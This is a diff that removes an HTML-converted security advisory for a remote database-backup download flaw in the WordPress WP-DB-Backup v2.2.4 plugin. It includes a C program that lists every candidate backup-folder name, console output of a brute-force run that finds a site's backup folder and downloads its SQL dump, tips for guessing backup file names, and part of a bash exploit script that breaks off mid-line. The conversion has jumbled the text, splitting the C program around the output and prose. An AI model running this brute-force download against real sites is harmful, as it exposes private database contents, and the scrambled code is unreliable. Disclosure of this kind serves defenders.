@@ -1,206 +1,168 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 81&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Wordpress WP-DB-Backup v2.2.4 Plugin Remote Database Backup Download Vulnerability&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2014-11-02&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://austinmatzko.com/wordpress-plugins/wp-db-backup/">http://austinmatzko.com/wordpress-plugins/wp-db-backup/</a>"&gt;<a href="http://austinmatzko.com/wordpress-plugins/wp-db-backup/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://austinmatzko.com/wordpress-plugins/wp-db-backup/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;pressedcode.com &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2014-11-04&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;P-DB-Backup allows you easily to backup your core WordPress database tables. You may also backup other tables in the same database.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;WP-DB-Backup creates a backup storage path under the wp-contents directory of the wordpress installation if the option to store backups locally is selected (not default). The path is:
-/wordpress/wp-content/backup-[5_characters_of_md5sum]/ Where the backup directory name is derived from lines in wp-db-backup.php:
-</p><p>    36 $rand = substr( md5( md5( DB_PASSWORD ) ), -5 );
-    .<br/>
-    .<br/>
-    42 if ( ! defined(&amp;#039;WP_BACKUP_DIR&amp;#039;) ) {
-    43         define(&amp;#039;WP_BACKUP_DIR&amp;#039;, $wpdbb_content_dir . &amp;#039;/backup-&amp;#039; . $rand . &amp;#039;/&amp;#039;);
-    44 }<br/>
-    45 <br/>
-    46 if ( ! defined(&amp;#039;WP_BACKUP_URL&amp;#039;) ) {
-    47         define(&amp;#039;WP_BACKUP_URL&amp;#039;, $wpdbb_content_url . &amp;#039;/backup-&amp;#039; . $rand . &amp;#039;/&amp;#039;);
-    48 }<br/>
-It&amp;#039;s not random enough as the md5 characters can only be 0-9 and a-f (hexadecimal), which turns out to be 16^5 possible combinations or 1048576. And it will always be five characters no less.
-A small C program can generate a rainbow table (uncompressed about 6MB) in a few seconds.
-</p><p>See exploit section for full PoC.
-</p><p>/<em>Create rainbow table for guessing wp-backup-db v2.2.4 backup path 
-Larry W. Cashdollar</em>/
-</p><p>#include &amp;lt;stdio.h&amp;gt;<br/>
-#include &amp;lt;stdlib.h&amp;gt;
-</p><p>int main (void)<br/>
-{<br/>
- char string[16] = &amp;quot;0123456789abcdef&amp;quot;;
- int x, y, z, a, b;
-</p><p> for (x = 0; x &amp;lt; 16; x++)<br/>
-   {
-</p><pre>
-     for (y = 0; y &amp;lt; 16; y++)
-        {
-          for (z = 0; z &amp;lt; 16; z++)</pre>
-
-<p>PoC output<br/>
-I&amp;rsquo;ve trimmed this down for brevity.
- 
-</p><p>root@vapidlabs:~# ./exp2.sh <a href="http://www.vapidlabs.com/">www.vapidlabs.com</a> 20141031
-[+] Searching....<br/>
-Percent Done: 0%<br/>
-Percent Done: 1.960700%<br/>
-Percent Done: 3.921500%<br/>
-Percent Done: 5.882300%<br/>
-Percent Done: 7.843100%<br/>
-Percent Done: 9.803900%<br/>
-Percent Done: 11.764700%<br/>
-Percent Done: 13.725400%<br/>
-Percent Done: 15.686200%<br/>
-Percent Done: 17.647000%<br/>
-Percent Done: 19.607800%<br/>
-Percent Done: 21.568600%<br/>
-Percent Done: 23.529400%<br/>
-Percent Done: 25.490100%<br/>
-Percent Done: 27.450900%<br/>
-Percent Done: 29.411700%<br/>
-Percent Done: 31.372500%<br/>
-Percent Done: 33.333300%<br/>
-Percent Done: 35.294100%<br/>
-Percent Done: 37.254900%<br/>
-Percent Done: 39.215600%<br/>
-Percent Done: 41.176400%<br/>
-Percent Done: 43.137200%<br/>
-Percent Done: 45.098000%<br/>
-Percent Done: 47.058800%<br/>
-Percent Done: 49.019600%<br/>
-Percent Done: 50.980300%<br/>
-Percent Done: 52.941100%<br/>
-Percent Done: 54.901900%<br/>
-Percent Done: 56.862700%<br/>
-Percent Done: 58.823500%<br/>
-Percent Done: 60.784300%<br/>
-Percent Done: 62.745000%<br/>
-Percent Done: 64.705800%<br/>
-Percent Done: 66.666600%<br/>
-Percent Done: 68.627400%<br/>
-Percent Done: 70.588200%<br/>
-Percent Done: 72.549000%<br/>
-Percent Done: 74.509800%<br/>
-Percent Done: 76.470500%<br/>
-Percent Done: 78.431300%<br/>
-Percent Done: 80.392100%<br/>
-Percent Done: 82.352900%<br/>
-Percent Done: 84.313700%<br/>
-Percent Done: 86.274500%<br/>
-Percent Done: 88.235200%<br/>
-Percent Done: 90.196000%<br/>
-Percent Done: 92.156800%<br/>
-Percent Done: 94.117600%<br/>
-Percent Done: 96.078400%<br/>
-[+] Location <a href="http://www.vapidlabs.com/wp-content/backup-baff5/">http://www.vapidlabs.com/wp-content/backup-baff5/</a> Found
-[+] Received HTTP/1.1 200 OK<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 5.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 6.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 7.00%<br/>
-Percent Done: 8.00%<br/>
-Percent Done: 8.00%<br/>
-Percent Done: 8.00%<br/>
-Percent Done: 8.00%<br/>
-Percent Done: 8.00%<br/>
-Percent Done: 8.00%<br/>
-[+] Database backup <a href="http://www.vapidlabs.com/wp-content/backup-baff5/wordpress_wp_20141031_036.sql">http://www.vapidlabs.com/wp-content/backup-baff5/wordpress_wp_20141031_036.sql</a> Found
-[+] Received HTTP/1.1 200 OK<br/>
---2014-11-17 09:44:35--  <a href="http://www.vapidlabs.com/wp-content/backup-baff5/wordpress_wp_20141031_036.sql">http://www.vapidlabs.com/wp-content/backup-baff5/wordpress_wp_20141031_036.sql</a>
-Resolving <a href="http://www.vapidlabs.com/">www.vapidlabs.com</a> (<a href="http://www.vapidlabs.com/">www.vapidlabs.com</a>)... <a href="telnet://192.168.0.26">192.168.0.26</a>
-Connecting to <a href="http://www.vapidlabs.com/">www.vapidlabs.com</a> (<a href="http://www.vapidlabs.com/">www.vapidlabs.com</a>)|<a href="telnet://192.168.0.26">192.168.0.26</a>|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 438401 (428K) [application/x-sql]
-Saving to: `wordpress_wp_20141031_036.sql&amp;#039;
-100%[===================================================================================&amp;gt;] 438,401     --.-K/s   in 0.001s  
-2014-11-17 09:44:35 (325 MB/s) - `wordpress_wp_20141031_036.sql&amp;#039; saved [438401/438401]
-Also the backup files are left open to any local user to read.
-$ ls -l wordpress_wp_20141031_036.sql<br/>
--rw-r--r-- 1 www-data www-data 438401 Oct 31 19:52 wordpress_wp_20141031_036.sql
-Recommended Fix:<br/>
-Create .htaccess directory under root backup directory.
-</p><pre>
-            {
-              for (a = 0; a &amp;lt; 16; a++)
-                {
-                  for (b = 0; b &amp;lt; 16; b++)
-                    {
-                      printf (&amp;quot;%c%c%c%c%c\n&amp;quot;, string[x], string[y], string[z],
-                              string[a], string[b]);
-                    }
-                }
-            }
-        }
-</pre>
-<p>   }<br/>
-return(0);<br/>
-}
-</p><p># gcc rainbow.c -o rain<br/>
-# time ./rain &amp;gt; rainbow
-</p><pre>
-real        0m0.193s
-user        0m0.188s
-sys        0m0.004s
-</pre>
-<p># ls -l rainbow<br/>
--rw-r--r-- 1 root root 6291456 Oct 31 21:21 rainbow
-<strong> wc -l rainbow<br/>
-1048576 rainbow<br/>
-So we&amp;</strong>039;ve got all of our possible directory locations, we just need a way to check when we&amp;#039;ve found the correct one.
-An attempt is made to block file listing by placing a 0 sized index.php file in the backup directory.
-Because of the index.php file we will know if we&amp;#039;ve gotten the correct directory name because we will receive a 200 response from the web server vs 404 file not found.
-So a full PoC would be create our rainbow table with target URL, run through all of the combinations until we get a 200 response.
-Then start guessing the SQL filename.<br/>
-The backup files can be guessed as they follow a common format:
-DBNAME_TABLE_PREFIX_YYYYMMDAY_SWATCH_TIME.sql.
-For example:<br/>
-wordpress_wp_20141031_036.sql<br/>
-wordpress typically defaults the Prefix name to wp_.
-The database name will be the hardest thing to guess, use some derivative of wordpress, wp, etc..
-File names are generated by lines in wp-db-backup.php:
-</p><pre>
-99                 $datum = date(&amp;quot;Ymd_B&amp;quot;);
-100                $this-&amp;gt;backup_filename = DB_NAME . &amp;quot;<u>$table</u>prefix$datum.sql&amp;quot;;
-</pre>
-<p>Where B is Swatch Internet time 000-999.  
-So PoC:<br/>
-Find out backup path name via brute force.
-Attempt to guess database backup file name, try DBNAME of wordpress, wpdb, wordpdb etc scan entire day from current swatch time back down to 000.
-Distribute backup path guessing over multiple hosts with different key spaces.
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=81"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#!/bin/bash&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#Larry W. Cashdollar, @<u>larry0&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#Will brute force and search a Wordpress target site with WP-DB-Backup v2.2.4 plugin installed for any backups done on&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#20141031 assumes the wordpress database is wordpress and the table prefix is wp</u>&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#<a href="http://thehackerblog.com/auditing-wp-db-backup-wordpress-plugin-why-using-the-database-password-for-entropy-is-a-bad-idea/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">http://thehackerblog.com/auditing-wp-db-backup-wordpress-plugin-why-using-the-database-password-for-entropy-is-a-bad-idea/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#run ./exp targetsite&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;a href="<a href="http://www.php.net/date">http://www.php.net/date</a>"&gt;&lt;span style="color: #990000;"&gt;DATE&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;20141031&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #666666; font-style: italic;"&gt;#Date to search&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;if&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt; &lt;span style="color: #339933;"&gt;!&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;e rainbow &lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; then&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;cat &lt;span style="color: #339933;"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;EOF&lt;span style="color: #339933;"&gt;-&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; rbow&lt;span style="color: #339933;"&gt;.&lt;/span&gt;c&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;/<em>Create rainbow table for guessing wp-backup-db v2.2.4 backup path&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;Larry W. Cashdollar</em>/&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;int&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;main &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;void&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#123;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  char string&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;16&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;0123456789abcdef&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  int x&lt;span style="color: #339933;"&gt;,&lt;/span&gt; y&lt;span style="color: #339933;"&gt;,&lt;/span&gt; z&lt;span style="color: #339933;"&gt;,&lt;/span&gt; a&lt;span style="color: #339933;"&gt;,&lt;/span&gt; b&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;  &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;x &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; x &lt;span style="color: #339933;"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;16&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; x&lt;span style="color: #339933;"&gt;++&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;      &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;y &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; y &lt;span style="color: #339933;"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;16&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; y&lt;span style="color: #339933;"&gt;++&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;          &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;z &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; z &lt;span style="color: #339933;"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;16&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; z&lt;span style="color: #339933;"&gt;++&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;              &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;a &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; a &lt;span style="color: #339933;"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;16&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; a&lt;span style="color: #339933;"&gt;++&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                  &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;b &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; b &lt;span style="color: #339933;"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;16&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; b&lt;span style="color: #339933;"&gt;++&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                      &lt;a href="<a href="http://www.php.net/printf">http://www.php.net/printf</a>"&gt;&lt;span style="color: #990000;"&gt;printf&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;&lt;span style="color: #009933; font-weight: bold;"&gt;%c&lt;/span&gt;&lt;span style="color: #009933; font-weight: bold;"&gt;%c&lt;/span&gt;&lt;span style="color: #009933; font-weight: bold;"&gt;%c&lt;/span&gt;&lt;span style="color: #009933; font-weight: bold;"&gt;%c&lt;/span&gt;&lt;span style="color: #009933; font-weight: bold;"&gt;%c&lt;/span&gt;&lt;span style="color: #000099; font-weight: bold;"&gt;\n&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; string&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;x&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; string&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;y&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; string&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;z&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                              string&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;a&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; string&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;b&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;return&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #339933;"&gt;-&lt;/span&gt;EOF&lt;span style="color: #339933;"&gt;-&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Compiling rbow.c&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;gcc rbow&lt;span style="color: #339933;"&gt;.&lt;/span&gt;c &lt;span style="color: #339933;"&gt;-&lt;/span&gt;o rbow&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Creating rainbow table...&amp;quot;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #339933;"&gt;./&lt;/span&gt;rbow &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; rainbow&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;fi&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;if&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt; &lt;span style="color: #339933;"&gt;!&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;e found&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt &lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span 